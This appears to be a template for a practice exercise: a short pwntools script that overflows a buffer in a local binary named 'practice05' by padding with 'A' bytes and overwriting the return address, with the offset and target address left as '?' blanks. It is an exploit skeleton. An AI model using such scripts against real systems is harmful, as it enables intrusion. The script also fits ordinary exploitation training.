from pwn import *

proc = process(["./practice05"])
#proc = remote("192.168.12.131",1621)
input("[b4 sending]")

count = ?
payload = b"A" * count
target = 0x?
payload += target.to_bytes(8,"little")
#payload = "sdsd"
proc.sendline(payload)
proc.interactive()

